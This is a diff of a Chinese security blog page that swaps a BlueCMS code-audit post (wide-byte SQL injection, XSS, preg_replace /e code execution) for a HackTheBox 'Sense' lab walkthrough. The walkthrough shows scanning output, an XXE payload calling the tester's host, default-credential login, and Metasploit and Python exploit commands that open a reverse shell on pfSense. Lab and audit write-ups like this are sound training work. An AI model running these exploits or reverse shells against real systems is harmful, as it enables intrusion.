@@ -228,7 +228,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/01/12/yuque/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Unc1e">
@@ -247,7 +247,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/01/12/yuque/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/" itemprop="url">BlueCMS代码审计小结</a></h1>
+                <a class="post-title-link" href="/2020/05/29/yuque/HackTheBox%EF%BC%9ASense%E7%AC%94%E8%AE%B0/" itemprop="url">HackTheBox：Sense笔记</a></h1>
         
 
         <div class="post-meta">
@@ -259,8 +259,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-12T10:02:24+08:00">
-                2020-01-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-29T13:12:57+08:00">
+                2020-05-29
               </time>
             
 
@@ -299,483 +299,43 @@
       
         
           
-            <h1 id="0x01-可重复安装"><a href="#0x01-可重复安装" class="headerlink" title="0x01 可重复安装"></a>0x01 可重复安装</h1><p>正常安装完成后，存在可重复安装的问题，因为 install.lock 未能生成.<br>freebuf 有篇文章说，问题出在 insall/index.php 的 158 行，错误地使用了 is_writable 函数。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578795057671-7c251453-b762-4cc1-90e1-3db6d081431c.png#align=left&display=inline&height=327&name=image.png&originHeight=653&originWidth=1231&size=193643&status=done&style=none&width=615.5" alt="image.png"><br>可是经过验证，发现并不是由这个函数导致的可重复安装问题</p>
-<p>首先，找一下 php 官方手册<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578795842491-0701f3a2-2657-4afd-9729-c9f683e09062.png#align=left&display=inline&height=374&name=image.png&originHeight=748&originWidth=1344&size=132042&status=done&style=none&width=672" alt="image.png"></p>
-<p>在代码里试着把布尔值 dump 出来看，是 true！看来并不是 158 行的判断出错了<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578795365792-fd05ba46-70ae-4322-ab07-9239b1b5661d.png#align=left&display=inline&height=88&name=image.png&originHeight=175&originWidth=744&size=27594&status=done&style=none&width=372" alt="image.png"></p>
-<p>之所以没有生成 install.lock, 不是因为 include 了两次, 也不是相同的变量 define 了两次<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578799654577-bc165bb0-f57a-4964-9f3a-da68c4dbd15f.png#align=left&display=inline&height=399&name=image.png&originHeight=799&originWidth=668&size=57370&status=done&style=none&width=334" alt="image.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578799338686-5f3cbbb3-5043-4372-84ee-bc0e762c95f1.png#align=left&display=inline&height=51&name=image.png&originHeight=101&originWidth=1009&size=16966&status=done&style=none&width=504.5" alt="image.png"><br>本地测试 include 两次,可正常运行</p>
-<p>而是因为<strong>没有处理异常</strong>, 而没有捕获处理的异常就是致命错误, 在 156 行便停止运行, 所以就没有走到 160 行以后的写 install.lock 的逻辑<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578802013716-ffd7a1af-e171-481b-a71c-cc52e580dca9.png#align=left&display=inline&height=197&name=image.png&originHeight=393&originWidth=1038&size=72901&status=done&style=none&width=519" alt="image.png"><br>除此之外, 由于编码被设置成了 gbk, 导致全局都存在 gbk 宽字节注入的问题</p>
-<h1 id="0x02-全局存在-gbk-宽字节注入"><a href="#0x02-全局存在-gbk-宽字节注入" class="headerlink" title="0x02  全局存在 gbk 宽字节注入"></a>0x02  全局存在 gbk 宽字节注入</h1><p><code>admin\include\common.inc.php:26处,</code>对用户入参进行了统一的 addslash 处理.<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578796696140-34e5062e-2567-4259-9c21-3ce12ddc939d.png#align=left&display=inline&height=57&name=image.png&originHeight=113&originWidth=1416&size=23644&status=done&style=none&width=708" alt="image.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578796867724-299c55bd-9535-4aad-bd1c-7032cc31bcd9.png#align=left&display=inline&height=222&name=image.png&originHeight=443&originWidth=1342&size=173854&status=done&style=none&width=671" alt="image.png"><br>在 install/index.php，缺少过滤，直接使转义符号\被吞掉, 导致注入<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578795788870-eda47cfd-0596-45a2-9305-78ac892d36ac.png#align=left&display=inline&height=141&name=image.png&originHeight=282&originWidth=1394&size=169872&status=done&style=none&width=697" alt="image.png"></p>
-<h1 id="0x03-安装处拿-shell"><a href="#0x03-安装处拿-shell" class="headerlink" title="0x03 安装处拿 shell"></a>0x03 安装处拿 shell</h1><p>利用<code>**%df + &quot;/&quot; =&gt; &quot;運&quot;**</code> ，吃掉’转义用的’&#39;, 直接注入了恶意内容, 需要注意的是<code>%df</code>里面的百分号会被 url 编码成<code>%25</code>，需要在 burp 里改回为% . 否则不能注入恶意代码，如图<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578801721901-bac41452-c13b-43c1-a536-0fab0c5f2918.png#align=left&display=inline&height=298&name=image.png&originHeight=596&originWidth=1028&size=111234&status=done&style=none&width=514" alt="image.png"></p>
-<h1 id="0x04-多处-xss"><a href="#0x04-多处-xss" class="headerlink" title="0x04 多处 xss"></a>0x04 多处 xss</h1><p>个人资料中 MSN：QQ：办公电话：家庭电话：手机：地址的参数都是经过 html 实体转义的, 不存在 xss 问题<br>可是, 在”用户管理&gt;&gt;我的个人资料”处, 存在将用户输入直接写进页面的操作,导致首页等能看到用户头像的地方都存在 xss<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580783981422-7f0fa2e9-faf5-4fed-b04b-8d391fcedf4a.png#align=left&display=inline&height=521&name=image.png&originHeight=1042&originWidth=1322&size=299783&status=done&style=none&width=661" alt="image.png"></p>
-<h1 id="0x05-uccode-class-php-命令执行"><a href="#0x05-uccode-class-php-命令执行" class="headerlink" title="0x05 uccode.class.php 命令执行"></a>0x05 uccode.class.php 命令执行</h1><p>首先介绍一下 php 正则匹配中的后向引用，一般用<code>${1}, ${2}</code>或者<code>\\1, \\2</code>来表示，如下面图中的两种使用方式</p>
-<blockquote>
-<p>后向引用是在 preg_replace($pattern, $replacement, $subject)中，将$pattern 中的原子参数（<code>Capturing Group</code>）重新组合的一种实现。</p>
+            <blockquote>
+<p>弄明白你打的网站，是什么 cms，跑的什么中间件，靶机风评如何，很有必要！</p>
 </blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1580787139061-9230eef6-4ed6-482f-9a22-5f954c129554.png#align=left&display=inline&height=255&name=image.png&originHeight=509&originWidth=1420&size=136249&status=done&style=none&width=710" alt="image.png"><br>例如上面 35 行那里，<code>\\1</code>代表<code>(=((https?|ftp|gopher|news|telnet|rtsp|mms|callto|bctp|ed2k|thunder|synacast){1}:\/\/|www\.)([^\[\&quot;&#39;]+?))?</code>， <code>\\5</code></p>
-<p>而这里的问题在于使用了<code>preg_replace /e</code>的模式, 稍加搜索就能发现, 这种模式可能导致命令执行, 即 php 会把$replacement 当成 php 代码执行 , 所以这里就是我们的代码注入点.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complie</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line">  $message = htmlspecialchars($message);</span><br><span class="line">  <span class="keyword">if</span>(strpos($message, <span class="string">'[/code]'</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">  $message = preg_replace(<span class="string">"/\s*\[code\](.+?)\[\/code\]\s*/ies"</span>, <span class="string">"\$this-&gt;codedisp('\\1')"</span>, $message);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(strpos($message, <span class="string">'[/url]'</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">  $message = preg_replace(<span class="string">"/\[url(=((https?|ftp|gopher|news|telnet|rtsp|mms|callto|bctp|ed2k|thunder|synacast)&#123;1&#125;:\/\/|www\.)([^\[\"']+?))?\](.+?)\[\/url\]/ies"</span>, <span class="string">"\$this-&gt;parseurl('\\1', '\\5')"</span>, $message);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(strpos($message, <span class="string">'[/email]'</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">  $message = preg_replace(<span class="string">"/\[email(=([a-z0-9\-_.+]+)@([a-z0-9\-_]+[.][a-z0-9\-_.]+))?\](.+?)\[\/email\]/ies"</span>, <span class="string">"\$this-&gt;parseemail('\\1', '\\4')"</span>, $message);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>10.10.10.60<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729425195-edd08efe-80aa-4fc8-8213-6be000a8f0fd.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=718&size=114205&status=done&style=none&width=359" alt="image.png">)<img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590729534655-00471b96-ee98-450a-96b8-2890c99047c3.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=401&size=43455&status=done&style=none&width=200.5" alt="image.png"></p>
+<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -p- -sC -sV 10.10.10.60</span></span><br><span class="line"></span><br><span class="line">nmap scan report for 10.10.10.60</span><br><span class="line">Host is up (0.0058s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT    STATE SERVICE    VERSION</span><br><span class="line">80/tcp  open  http       lighttpd 1.4.35</span><br><span class="line">|_http-server-header: lighttpd/1.4.35</span><br><span class="line">|_http-title: Did not follow redirect to https://10.10.10.60/</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (<span class="keyword">use</span> -d <span class="keyword">to</span> debug)</span><br><span class="line"><span class="number">443</span>/tcp <span class="keyword">open</span>  ssl/https?</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does <span class="keyword">not</span> represent <span class="built_in">time</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>还有几个地方比较有趣，但是不足以串联起来利用，此处汇总起来，供各位参考</p>
-<h1 id="PHP-弱类型"><a href="#PHP-弱类型" class="headerlink" title="PHP 弱类型"></a>PHP 弱类型</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578805270942-f55720c5-a3bc-453a-88d1-f2003e8b2aec.png#align=left&display=inline&height=118&name=image.png&originHeight=235&originWidth=1117&size=67348&status=done&style=none&width=558.5" alt="image.png"></p>
-<p>除去不符合代码规范的部分（双目运算符左右要有 1 个空格的嘛），这里还错误地使用了不严格比较的<code>==</code>运算符，在两边取值都特殊的情况下，也能通过判断。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578841430009-118fda11-0697-4b0b-8b66-6b08d32065b3.png#align=left&display=inline&height=990&originHeight=990&originWidth=1708&size=0&status=done&style=none&width=1708" alt=""></p>
+<h1 id="lighttpd-1-4-35"><a href="#lighttpd-1-4-35" class="headerlink" title="lighttpd 1.4.35"></a>lighttpd 1.4.35</h1><p>80 端口会跳转到 443，443 端口是这个 web<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766011762-f1f15c9a-d60e-43de-b3d3-6919607efa83.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=994&originWidth=1577&size=170558&status=done&style=none&width=788.5" alt="image.png"></p>
+<h2 id="dirb-扫目录"><a href="#dirb-扫目录" class="headerlink" title="dirb 扫目录"></a>dirb 扫目录</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">[~]$ dirb https://10.10.10.60</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">START_TIME: Fri May 29 05:22:42 2020</span><br><span class="line">URL_BASE: https://10.10.10.60/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">-----------------</span></span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Scanning URL: https://10.10.10.60/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/classes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/css/</span><br><span class="line">+ https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/includes/</span><br><span class="line">+ https://10.10.10.60/index.html (CODE:200|SIZE:329)</span><br><span class="line">+ https://10.10.10.60/index.php (CODE:200|SIZE:6690)</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/installer/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/themes/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/tree/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/</span><br><span class="line">+ https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/classes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/css/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/includes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/installer/ ----</span></span><br><span class="line">+ https://10.10.10.60/installer/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/index/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/wizard/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/themes/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/tree/ ----</span></span><br><span class="line">+  (CODE:200|SIZE:7492)</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/include/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/javascript/</span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/widgets/widgets/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/index/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/ ----</span></span><br><span class="line">==&gt; DIRECTORY: https://10.10.10.60/javascript/jquery/images/</span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/wizard/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/include/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/javascript/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/widgets/widgets/ ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">---- Entering directory: https://10.10.10.60/javascript/jquery/images/ ----</span></span><br></pre></td></tr></table></figure>
 
-          
-        
-      
-    </div>
-    
-    
-    
+<h3 id="xmlrpc-php"><a href="#xmlrpc-php" class="headerlink" title="/xmlrpc.php"></a>/xmlrpc.php</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590731574070-bd7757a6-e59e-4f3e-8ba0-b994cbbeb732.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=842&size=22571&status=done&style=none&width=421" alt="image.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY % pe SYSTEM "http://10.10.14.4:88"&gt; %pe; %param1; ]&gt;</span><br><span class="line">&lt;foo&gt;&amp;external;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
 
-    
+<p>测试过，无 xxe 问题</p>
+<h3 id="tree-index-html"><a href="#tree-index-html" class="headerlink" title="/tree/index.html"></a>/tree/index.html</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590733092577-5ab408a8-e773-4d0e-89fb-004d49d1e546.png#align=left&display=inline&height=987&margin=%5Bobject%20Object%5D&name=dragonfly.png&originHeight=987&originWidth=1910&size=236078&status=done&style=none&width=1910" alt="dragonfly.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   Connect to host via SSH:</span><br><span class="line">   &lt;applet CODEBASE="." ARCHIVE="jta20.jar" CODE="de.mud.jta.Applet" WIDTH=55 HEIGHT=25&gt;</span><br><span class="line">&lt;param NAME="config" VALUE="applet.conf"&gt;</span><br><span class="line">   &lt;/applet&gt;</span><br></pre></td></tr></table></figure>
 
-    
+<p>不知道啥意思。。。</p>
+<h1 id="breakthrough"><a href="#breakthrough" class="headerlink" title="breakthrough"></a>breakthrough</h1><p>用 dirbuster 再扫目录，用最大的字典</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
 
-    
+<p>find something juicy，发现了些好东西</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://10.10.10.60//changelog.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment"># Security Changelog</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Issue</span></span><br><span class="line">There was a failure in updating the firewall. Manual patching is therefore required</span><br><span class="line"></span><br><span class="line"><span class="comment">### Mitigated</span></span><br><span class="line">2 of 3 vulnerabilities have been patched.</span><br><span class="line"></span><br><span class="line"><span class="comment">### Timeline</span></span><br><span class="line">The remaining patches will be installed during the next maintenance window</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://10.10.10.60/system-users.txt</span></span><br><span class="line">//内容如下</span><br><span class="line"><span class="comment">####Support ticket###</span></span><br><span class="line"></span><br><span class="line">Please <span class="keyword">create</span> the <span class="keyword">following</span> <span class="keyword">user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username: Rohit</span><br><span class="line"><span class="keyword">password</span>: company <span class="keyword">defaults</span></span><br></pre></td></tr></table></figure>
 
-    <footer class="post-footer">
-      
+<p>公司默认密码？osint，搜索引擎走起<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766665129-28940fa6-a83a-4b18-b6ae-66eb2fd4de86.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=899&originWidth=1554&size=143893&status=done&style=none&width=777" alt="image.png"></p>
+<p>直接登录了哦，<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590766843344-cc662a21-85d7-4ac0-bfbd-62ddf43506c4.png#align=left&display=inline&height=942&margin=%5Bobject%20Object%5D&name=logined.png&originHeight=942&originWidth=1613&size=177747&status=done&style=none&width=1613" alt="logined.png"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set username rohit</span><br><span class="line">username =&gt; rohit</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set password pfsense</span><br><span class="line">password =&gt; pfsense</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; 10.10.16.122</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; set rhosts 10.10.10.60</span><br><span class="line">rhosts =&gt; 10.10.10.60</span><br><span class="line">msf5 exploit(unix/http/pfsense_graph_injection_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload</span><br><span class="line">[*] Payload uploaded successfully, executing</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.60</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.16.122:4444 -&gt; 10.10.10.60:39519) at 2020-05-29 23:26:58 +0800</span><br></pre></td></tr></table></figure>
 
-      
+<p>或者用 searchexploit 里的 exp 拿 shell<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1590767623073-864541e9-c3ab-45f9-97e5-4db13ce45006.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=py-exp.png&originHeight=141&originWidth=1187&size=57572&status=done&style=none&width=1187" alt="py-exp.png"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3 43560.py --rhost 10.10.10.60  --lhost 10.10.16.122 --lport 1337 --username rohit --password pfsense</span></span><br></pre></td></tr></table></figure>
 
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/01/10/yuque/NexusPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Unc1e">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Unc1e的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/01/10/yuque/NexusPHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E7%BB%93/" itemprop="url">NexusPHP代码审计小结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-10T17:28:56+08:00">
-                2020-01-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这套 cms，存在全局过滤 sql 注入的函数</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578665090979-a178b3e4-c646-472a-bb10-fd5e69a0fc12.png#align=left&display=inline&height=159&name=image.png&originHeight=318&originWidth=1286&size=81714&status=done&style=none&width=643" alt="image.png"></p>
-<p>用 mysql 防注入函数转义，并且用单引号包裹住语句，导致无法注入引号，也无法引入变量（单引号中的$不会被识别成变量）<br>并且常常有整型转换<br><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578664936920-1a5f4e5e-16d5-4b7e-a645-bc08cc176ec2.png#align=left&display=inline&height=44&name=image.png&originHeight=88&originWidth=1168&size=38960&status=done&style=none&width=584" alt="image.png"></p>
-<h1 id="0x01-iconv-的截断"><a href="#0x01-iconv-的截断" class="headerlink" title="0x01 iconv 的截断"></a>0x01 iconv 的截断</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578665878342-7e973113-92e5-4271-9233-65e3c209d036.png#align=left&display=inline&height=273&name=image.png&originHeight=546&originWidth=1226&size=140625&status=done&style=none&width=613" alt="image.png"></p>
-<p>我们看下 php 官方的文档，关于 iconv 这个函数，官方是怎么说的</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578666013310-5df9fe05-e9c6-40d4-ab71-035c75c8d1f7.png#align=left&display=inline&height=432&name=image.png&originHeight=864&originWidth=1394&size=191228&status=done&style=none&width=697" alt="image.png"></p>
-<p>在 PHP &lt; 5.4.0，字符非法时会被截断，只返回非法字符串之前能正常解码的内容<br>在 PHP &gt;= 5.4.0 时，字符非法时会报错返回 False，除非输出字符串里拼接了//IGNORE，本套 cms 就是这种情况</p>
-<p>也就是说，我们可以控制输出，利用特性 bypass 文件后缀之类的检测</p>
-<h1 id="0x02-nowarn-php-存在-sql-注入"><a href="#0x02-nowarn-php-存在-sql-注入" class="headerlink" title="0x02 nowarn.php 存在 sql 注入"></a>0x02 nowarn.php 存在 sql 注入</h1><blockquote>
-<p>需要登录且不为普通用户</p>
-</blockquote>
-<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1578664268612-5386c2e7-7661-4dbe-8d8b-6aecd5064ef1.png#align=left&display=inline&height=461&name=image.png&originHeight=922&originWidth=1777&size=303610&status=done&style=none&width=888.5" alt="image.png"><br>nowarn.php 的第 36 行开始，直接拼接进 sql 语句了</p>
